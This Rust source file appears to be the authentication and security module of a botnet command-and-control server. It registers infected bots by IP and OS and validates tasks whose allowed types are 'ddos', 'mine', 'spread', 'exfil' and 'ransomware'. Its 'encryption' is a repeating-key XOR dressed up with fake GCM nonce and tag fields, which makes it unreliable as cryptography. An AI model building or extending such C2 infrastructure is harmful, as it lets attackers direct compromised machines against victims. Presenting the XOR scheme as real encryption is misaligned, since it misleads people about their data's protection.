use jsonwebtoken::{encode, decode, Header, Algorithm, Validation, EncodingKey, DecodingKey, errors::Error};
use serde::{Deserialize, Serialize};
use bcrypt::{hash, verify, DEFAULT_COST};
use sha2::Sha256;
use validator::Validate;
use std::time::{SystemTime, UNIX_EPOCH};
use std::sync::Mutex;
use base64::{Engine as _, engine::general_purpose};

// JWT Claims structure
#[derive(Debug, Serialize, Deserialize)]
pub struct Claims {
    pub sub: String,  // Subject (user/bot ID)
    pub role: String, // Role (admin, bot, etc.)
    pub exp: usize,   // Expiration time
    pub iat: usize,   // Issued at
}

// User authentication structure
#[derive(Debug, Serialize, Deserialize, Validate)]
pub struct AuthRequest {
    #[validate(length(min = 3, max = 50))]
    pub username: String,
    #[validate(length(min = 8, max = 128))]
    pub password: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct AuthResponse {
    pub token: String,
    pub expires_in: usize,
}

// Bot registration structure with validation
#[derive(Debug, Serialize, Deserialize, Validate)]
pub struct SecureBotInfo {
    #[validate(length(min = 8, max = 64))]
    pub id: String,
    #[validate(length(min = 7, max = 45))] // IPv4/IPv6 length
    pub ip: String,
    #[validate(length(min = 1, max = 50))]
    pub os: String,
    pub last_seen: String,
    #[validate(length(min = 1, max = 20))]
    pub status: String,
    pub signature: String, // HMAC signature for integrity
}

// Task structure with encryption
#[derive(Debug, Serialize, Deserialize, Validate)]
pub struct SecureTask {
    #[validate(length(min = 1, max = 100))]
    pub id: String,
    #[validate(length(min = 8, max = 64))]
    pub bot_id: String,
    #[validate(length(min = 1, max = 50))]
    pub task_type: String,
    #[validate(length(max = 1000))] // Limit parameter size
    pub params: String,
    #[validate(length(min = 1, max = 20))]
    pub status: String,
    pub created_at: String,
    pub nonce: String, // For encryption
    pub tag: String,   // GCM authentication tag
}

// Encryption manager
pub struct EncryptionManager {
    key: Vec<u8>,
    jwt_secret: String,
}

impl EncryptionManager {
    pub fn new(encryption_key: &str, jwt_secret: &str) -> Self {
        // Simple key derivation - hash the key with SHA256
        use sha2::Digest;
        let mut hasher = Sha256::new();
        hasher.update(encryption_key.as_bytes());
        hasher.update(b"narnia_salt");
        let key = hasher.finalize();

        Self {
            key: key.to_vec(),
            jwt_secret: jwt_secret.to_string(),
        }
    }

    // JWT token generation
    pub fn generate_token(&self, user_id: &str, role: &str, expiry_hours: usize) -> Result<String, Error> {
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs() as usize;

        let claims = Claims {
            sub: user_id.to_string(),
            role: role.to_string(),
            exp: now + (expiry_hours * 3600),
            iat: now,
        };

        encode(
            &Header::default(),
            &claims,
            &EncodingKey::from_secret(self.jwt_secret.as_bytes()),
        )
    }

    // JWT token validation
    pub fn validate_token(&self, token: &str) -> Result<Claims, Error> {
        let validation = Validation::new(Algorithm::HS256);
        let token_data = decode::<Claims>(
            token,
            &DecodingKey::from_secret(self.jwt_secret.as_bytes()),
            &validation,
        )?;
        Ok(token_data.claims)
    }

    // Encrypt data using simple XOR (for demonstration - replace with proper AES-GCM in production)
    pub fn encrypt_data(&self, data: &str) -> Result<(String, String, String), Box<dyn std::error::Error>> {
        let data_bytes = data.as_bytes();
        let mut encrypted = Vec::new();

        // Simple XOR encryption with key
        for (i, &byte) in data_bytes.iter().enumerate() {
            let key_byte = self.key[i % self.key.len()];
            encrypted.push(byte ^ key_byte);
        }

        // Generate fake nonce and tag for compatibility
        let nonce = general_purpose::STANDARD.encode(format!("nonce_{}", rand::random::<u64>()));
        let tag = general_purpose::STANDARD.encode(format!("tag_{}", rand::random::<u64>()));

        Ok((
            general_purpose::STANDARD.encode(encrypted),        // Ciphertext
            nonce,                            // Fake nonce
            tag,                              // Fake tag
        ))
    }
}

// Password hashing utilities
pub struct PasswordManager;

impl PasswordManager {
    pub fn hash_password(password: &str) -> Result<String, bcrypt::BcryptError> {
        hash(password, DEFAULT_COST)
    }

    pub fn verify_password(password: &str, hash: &str) -> Result<bool, bcrypt::BcryptError> {
        verify(password, hash)
    }
}

// Input validation utilities
pub struct ValidationManager;

impl ValidationManager {
    pub fn validate_bot_info(bot_info: &SecureBotInfo) -> Result<(), validator::ValidationErrors> {
        bot_info.validate()
    }

    pub fn validate_task(task: &SecureTask) -> Result<(), validator::ValidationErrors> {
        task.validate()
    }

    pub fn validate_ip(ip: &str) -> bool {
        // Basic IP validation (IPv4 and IPv6)
        ip.parse::<std::net::IpAddr>().is_ok()
    }

    pub fn validate_task_type(task_type: &str) -> bool {
        matches!(task_type, "ddos" | "mine" | "spread" | "exfil" | "ransomware" | "sleep" | "update")
    }
}

// Rate limiting structure
#[derive(Debug)]
pub struct RateLimiter {
    requests: std::collections::HashMap<String, Vec<u64>>,
    max_requests: u32,
    window_seconds: u64,
}

impl RateLimiter {
    pub fn new(max_requests: u32, window_seconds: u64) -> Self {
        Self {
            requests: std::collections::HashMap::new(),
            max_requests,
            window_seconds,
        }
    }

    pub fn check_rate_limit(&mut self, identifier: &str) -> bool {
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs();

        let user_requests = self.requests.entry(identifier.to_string())
            .or_insert_with(Vec::new);

        // Remove old requests outside the window
        user_requests.retain(|&timestamp| now - timestamp < self.window_seconds);

        // Check if under limit
        if user_requests.len() >= self.max_requests as usize {
            return false;
        }

        // Add current request
        user_requests.push(now);
        true
    }
}

// Security middleware for Rocket
pub struct SecurityMiddleware {
    pub encryption: EncryptionManager,
    pub rate_limiter: Mutex<RateLimiter>,
}

impl SecurityMiddleware {
    pub fn new(encryption: EncryptionManager, rate_limiter: RateLimiter) -> Self {
        Self {
            encryption,
            rate_limiter: Mutex::new(rate_limiter),
        }
    }

    pub fn authenticate_request(&self, token: Option<&str>) -> Result<Claims, &'static str> {
        match token {
            Some(token_str) => {
                self.encryption.validate_token(token_str)
                    .map_err(|_| "Invalid token")
            }
            None => Err("No token provided"),
        }
    }

    pub fn check_rate_limit(&self, identifier: &str) -> bool {
        let mut limiter = self.rate_limiter.lock().unwrap();
        limiter.check_rate_limit(identifier)
    }

    pub fn encrypt_task(&self, task: &SecureTask) -> Result<SecureTask, Box<dyn std::error::Error>> {
        let task_json = serde_json::to_string(task)?;
        let (encrypted_data, nonce, tag) = self.encryption.encrypt_data(&task_json)?;

        Ok(SecureTask {
            id: task.id.clone(),
            bot_id: task.bot_id.clone(),
            task_type: task.task_type.clone(),
            params: encrypted_data,
            status: task.status.clone(),
            created_at: task.created_at.clone(),
            nonce,
            tag,
        })
    }
}
